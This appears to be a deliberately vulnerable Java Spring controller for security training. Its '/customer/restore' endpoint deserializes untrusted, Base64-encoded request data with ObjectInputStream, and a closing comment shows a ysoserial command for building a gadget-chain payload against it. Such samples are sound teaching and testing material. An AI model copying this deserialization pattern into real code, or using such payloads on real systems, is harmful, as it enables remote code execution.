package com.crm.vulnerable;

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.Base64;

@RestController
@RequestMapping("/customer")
public class CustomerController {
    @PostMapping("/restore")
    public String restoreCustomer(HttpServletRequest request) {
        try {
            String serializedData = request.getParameter("data");
            byte[] decoded = Base64.getDecoder().decode(serializedData);
            ByteArrayInputStream bais = new ByteArrayInputStream(decoded);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Customer customer = (Customer) ois.readObject();
            ois.close();
            return "Restored customer: " + customer.getName();
        } catch (Exception e) {
            return "Error restoring customer: " + e.getMessage();
        }
    }
}

class Customer implements java.io.Serializable {
    private String name;
    private int id;
    public Customer(String name, int id) {
        this.name = name;
        this.id = id;
    }
    public String getName() { return name; }
    public int getId() { return id; }
}

/*
Example malicious payload using ysoserial:
java -jar ysoserial.jar CommonsCollections5 "calc" | base64
*/